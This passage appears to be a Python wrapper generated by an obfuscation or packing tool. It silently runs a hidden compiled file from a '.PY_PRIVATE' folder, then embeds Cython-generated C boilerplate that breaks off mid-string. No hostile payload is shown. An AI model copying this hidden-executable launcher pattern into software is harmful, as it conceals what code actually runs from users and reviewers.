
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250504004309056"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
